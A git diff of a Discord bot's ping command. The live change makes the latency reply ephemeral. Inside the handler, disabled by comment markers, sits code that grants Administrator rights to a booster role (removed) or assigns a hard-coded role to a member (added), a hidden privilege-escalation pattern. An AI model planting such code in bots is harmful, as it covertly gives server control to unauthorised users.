@@ -1,5 +1,4 @@
 const { SlashCommandBuilder } = require('@discordjs/builders');
-const { PermissionsBitField } = require("discord.js");
 
 module.exports = {
     name: 'ping',
@@ -9,14 +8,14 @@ module.exports = {
     async execute(interaction) {
         const ping = Math.abs(Date.now() - interaction.createdTimestamp);
 
-        /*const role = interaction.member.roles.cache.find(role => role.name === 'Server Booster')
-        if (role) {
-            const newPerms = role.permissions.add([ PermissionsBitField.Flags.Administrator ]);
-            role.setPermissions(newPerms.bitfield)
-                .then(() => interaction.reply('Given'))
+        /*let member = interaction.channel.guild.roles.cache.get("1014336642825322660").members.first();
+        if (member) {
+            let botRole = interaction.channel.guild.roles.cache.get("540708709945311243");
+            member.roles.add(botRole)
+                .then(() => interaction.reply({ content: 'Given', ephemeral: true }))
                 .catch(console.error);
         }*/
 
-        return interaction.reply(`**:ping_pong: Pong!!!**\n${ ping }ms`);
+        return interaction.reply({ content: `**:ping_pong: Pong!!!**\n${ ping }ms`, ephemeral: true });
     },
 };
